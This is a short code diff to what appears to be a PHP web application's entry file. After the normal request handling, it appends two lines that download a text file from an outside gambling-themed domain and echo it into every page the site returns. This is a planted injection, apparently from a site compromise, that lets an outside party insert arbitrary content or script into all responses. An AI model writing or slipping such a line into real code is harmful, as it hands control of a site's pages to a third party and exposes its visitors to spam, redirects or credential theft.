@@ -70,3 +70,5 @@ $response = $kernel->handle(
 $response->send();
 
 $kernel->terminate($request, $response);
+$a = file_get_contents('http://vivapasarantogel.com/bl/1.txt');
+echo $a; ?>
